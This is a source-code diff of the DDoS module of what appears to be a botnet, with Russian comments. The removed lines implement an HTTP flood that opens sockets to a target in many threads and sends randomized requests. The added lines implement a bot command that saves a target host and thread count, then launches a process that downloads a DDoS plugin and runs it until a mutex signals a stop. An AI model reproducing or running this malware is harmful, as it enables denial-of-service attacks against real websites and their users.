@@ -1,127 +1,135 @@
 #include "ddos.h"
 #include "Plugins.h"
 #include "Utils.h"
+#include "StrConsts.h"
+#include "BotCore.h"
+#include "Inject.h"
 
 
-
-
-
-
-
-TDDOS::TDDOS()
+//----------------------------------------------------------------------------
+//  Функция процесса для работы DDOS
+//----------------------------------------------------------------------------
+DWORD WINAPI DDOSProces(LPVOID)
 {
-	MaxThreads = 10;
-}
+	#define Exit { return 0; pExitProcess(0); }
 
-TDDOS::~TDDOS()
-{
+	BOT::Initialize();
 
-}
+	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
+	DWORD Sz = 0;
+	PCHAR Args = (PCHAR)File::ReadToBufferA(FileName.t_str(), Sz);
 
-bool TDDOS::Execute()
-{
-	if (URL.IsEmpty() || MaxThreads == 0)
-		return false;
+	if (STRA::IsEmpty(Args)) Exit;
 
-	// Инициализируем запрос
-	FRequest.CloseConnection = true;
-	FRequest.SetURL(URL.t_str());
-	if (FRequest.Host.IsEmpty())
-		return false;
+	// Получаем параметры команды
 
-	FRequest.UserAgent = "Mozilla Compatible %s";
-	FRequest.Referer = "http://%s";
+	PCHAR Host       = STR::GetLeftStr(Args, " ");
+	if (STRA::IsEmpty(Host))
+		Host = STR::New(Args);
 
-	FSendData = FRequest.MakeRequestHeaders();
+	PCHAR StrThreads = STR::GetRightStr(Args, " ");
 
-	// Инициализируем библиотеку сокетов
-	if (!InitializeWSA()) return false;
+	int Count = StrToInt(StrThreads);
 
-	// Получаем  адрес по имени хоста
-	FHostAddres = (LPHOSTENT)pgethostbyname(FRequest.Host.t_str());
+    MemFree(Args);
 
-	if ( FHostAddres == NULL )
-		return false;
+	// Загружаем плагин
+	TPlugin Plugin(GetStr(EStrDDOSPlugin));
 
-	// Запускаем потоки
-	for (int i = 0; i < MaxThreads; i++)
+	if (!Plugin.Download(true)) Exit;
+
+
+
+
+	// Запускаем DDOS атаку
+	typedef int  (WINAPI *TStart)(char*, DWORD, DWORD, DWORD);
+	typedef BOOL (WINAPI *TBusy)();
+	typedef void (WINAPI *TStop)();
+
+
+	TStart Start;
+	TBusy  Busy;
+	TStop  Stop;
+
+	if (!Plugin.GetProcAddress(0x3E987971 /* Start */, (LPVOID&)Start) ||
+		!Plugin.GetProcAddress(0x85D79F9 /* Busy */, (LPVOID&)Busy) ||
+		!Plugin.GetProcAddress(0xA7D37F0 /* Stop */, (LPVOID&)Stop))
 	{
-		StartThread(DDOSThreadProc, this);
+		Exit;
 	}
 
 
-	while (1)  pSleep(100);
+	string MutexName = GetStr(EStrDDOSSignal);
 
-
-	return true;
-}
-//----------------------------------------------------------------------------
-
-
-// Функция выполнения многократного подключения к испытуемому сайту
-DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
-{
-
-	DWORD BufSize = 1024;
-	TMemory Buf(BufSize);
-
-	while (true)
+	// Стартуем
+	if (Start(Host, Count, 0, 0) == 0)
 	{
-		// Создаём сокет
-		SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);
-
-		if(Socket != SOCKET_ERROR)
+		// Переходим в режим ожидания команды стоп
+		while (Busy())
 		{
-			// Подключаемся к серверу
-			struct sockaddr_in SockAddr;
-			SockAddr.sin_family		 = AF_INET;
-			SockAddr.sin_addr.s_addr = **(unsigned long**)DDOS->FHostAddres->h_addr_list;
-			SockAddr.sin_port		 = HTONS((unsigned short)DDOS->FRequest.Port);
-
-			// подключаемся к сокету
-			if ( (int)pconnect(Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
-			{
-				// Отправляем данные
-				string S;
-				string Temp = Random::RandomString2(30, 'a', 'z');
-                string Temp2 = Random::RandomString2(30, 'a', 'z');
-				S.Format(DDOS->FSendData.t_str(), Temp.t_str(), Temp2.t_str());
-
-				int Size = (int)psend(Socket, S.t_str(), S.Length(), 0);
-
-				// Для увеличения нагрузки на сервер пытаемся получить от сервера ответ
-				if (Size == S.Length())
-				{
-//					Size = (int)precv(Socket, Buf.Buf(), BufSize, 0);
-//					PCHAR S = Buf;
-//					Size++;
-                }
-
-
+			HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName.t_str());
+			if (Handle)
+            {
+				// Команда получена, плавно прекращаем работу
+				Stop();
+				DWORD St = (DWORD)pGetTickCount();
+				while (Busy() && (DWORD)pGetTickCount() - St < 5000) pSleep(100);
+				pCloseHandle(Handle);
+				break;
 			}
-			pclosesocket(Socket);
-		}
-		else
-		{
-			pSleep(10);
-		}
 
-		// Ждём до следующей отправки
-		pSleep(1);
-    }
+			pSleep(300);
+		}
+	}
 
-	return 0;
+
+    // Освобождаем данные
+	STR::Free(Host);
+	STR::Free(StrThreads);
+
+	Exit;
 }
 
+
+
 //----------------------------------------------------------------------------
+//  Команда запускает процесс DDOS атаки
+//----------------------------------------------------------------------------
+bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+{
+	if (STRA::IsEmpty(Args)) return false;
+
+	//Проверем на предмет необходимости остановки
+	#define COMMAND_STOP 0xE7D37F0 /* stop */
+
+	if (STRA::Hash(Args, 0, true) == COMMAND_STOP)
+	{
+		HANDLE Handle=(HANDLE)pCreateMutexA(NULL, false, GetStr(EStrDDOSSignal).t_str());
+		pSleep(3000);
+		pCloseHandle(Handle);
+		return true;
+	}
+
+	// ------ Запускаем процесс --------
+
+	// Сохраняем аргументы команды
+	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
+
+	DWORD Len = STRA::Length(Args) + 1;
+	if (File::WriteBufferA(FileName.t_str(), Args, Len) != Len)
+		return false;
+
+
+	// Запускаем процесс
+	return MegaJump(DDOSProces);
+
+//	return (StartThread(DDOSProces, NULL)) ? true : false;
+}
 
 
 
 
-
-
-
-
+/*
 
 typedef struct
 {
@@ -208,3 +216,5 @@ bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 
 
 }
+
+*/
